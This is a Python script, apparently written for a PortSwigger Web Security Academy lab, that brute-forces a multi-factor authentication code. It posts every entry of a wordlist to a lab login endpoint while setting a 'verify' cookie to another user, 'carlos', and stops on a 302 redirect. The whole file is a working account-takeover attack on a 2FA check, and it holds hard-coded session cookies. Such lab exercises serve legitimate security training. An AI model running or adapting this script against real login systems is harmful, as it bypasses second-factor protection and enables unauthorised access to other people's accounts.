import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-w', '--wordlist', required=True, help='Chemin vers la liste de codes')
args = parser.parse_args()

burp0_url = "https://0aea009803c4d14381e7cfb30041008a.web-security-academy.net:443/login2"
burp0_cookies = {"session": "0Rz1FzpPmNHEo0nX1tC59mJjkA6ozpCW", "verify": "carlos"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a6100700341223880a2df76002600d5.web-security-academy.net", "Referer": "https://0a6100700341223880a2df76002600d5.web-security-academy.net/login2", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "X-Pwnfox-Color": "green", "Te": "trailers"}

with open(args.wordlist, 'r') as f:
    for line in f:
        code = line.strip()
        burp0_data = {"mfa-code": code}
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        if response.status_code == 302:
            print(f'Code valide trouvé: {code}')
            break
        else:
            next
